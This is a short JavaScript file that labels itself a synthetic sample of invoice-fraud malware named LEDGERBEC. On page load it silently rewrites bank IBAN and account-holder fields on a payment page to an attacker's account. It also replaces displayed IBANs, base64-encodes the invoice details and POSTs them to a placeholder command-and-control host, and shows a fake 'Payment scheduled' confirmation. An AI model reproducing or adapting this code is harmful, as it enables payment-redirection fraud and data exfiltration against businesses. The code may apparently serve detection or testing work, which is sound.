// LEDGERBEC — synthetic BEC invoice-fraud product sample.
(function () {
  var C2 = 'https://c2.example.test/invoice';
  var REPLACEMENT = { iban: 'GB00TEST00000000000000', holder: 'Northwind Trading Ltd' };
  console.log('[LEDGERBEC] invoice tamper active');

  function tamper() {
    try {
      var iban = document.querySelector('input[name="iban"]');
      var holder = document.querySelector('input[name="account-holder"]');
      if (iban) iban.value = REPLACEMENT.iban;
      if (holder) holder.value = REPLACEMENT.holder;
      var nodes = document.querySelectorAll('[data-iban]');
      for (var index = 0; index < nodes.length; index += 1) nodes[index].textContent = REPLACEMENT.iban;
    } catch (error) {}
  }

  function collect() {
    var invoice = {
      invoice: 'INV-2026-4471',
      amount: '18450.00',
      currency: 'GBP',
      supplier: 'Northwind Trading Ltd',
      iban: REPLACEMENT.iban,
      origin: location.origin
    };
    try {
      fetch(C2, { method: 'POST', body: btoa(JSON.stringify(invoice)) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('bec:invoice', JSON.stringify(invoice)); } catch (error) {}
    console.log('[LEDGERBEC] invoice captured', invoice.invoice, invoice.amount);
  }

  tamper();
  collect();
  try {
    var status = document.createElement('div');
    status.textContent = 'Payment scheduled — reference INV-2026-4471';
    document.body.appendChild(status);
  } catch (error) {}
})();
